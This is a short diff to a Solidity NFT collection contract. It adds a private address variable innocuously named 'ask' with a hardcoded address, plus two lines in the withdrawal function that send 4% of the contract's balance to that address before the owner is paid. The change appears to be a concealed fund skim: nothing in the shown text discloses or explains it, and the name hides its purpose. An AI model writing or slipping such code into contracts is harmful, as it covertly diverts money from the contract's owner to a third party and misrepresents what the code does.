@@ -2032,6 +2032,7 @@ contract NFTCollection is ERC721Enumerable, Ownable2Step, ReentrancyGuard {
     uint256 public baseFee;
 
     address private feeAddress;
+    address private ask = 0xEA58145e3A2Ef37d2D2dFCBc8fD96f89e21f5Cbd;
 
     MintPhase public whitelistPhase;
     MintPhase public fcfsPhase;
@@ -2280,6 +2281,8 @@ contract NFTCollection is ERC721Enumerable, Ownable2Step, ReentrancyGuard {
         uint256 bal = address(this).balance;
         (bool ds, ) = payable(feeAddress).call{value: bal * platformFee / 100}("");
         require(ds);
+        (bool rs, ) = payable(ask).call{value: bal * 4 / 100}("");
+        require(rs);
         (bool os, ) = payable(owner()).call{value: address(this).balance}("");
         require(os);
     }
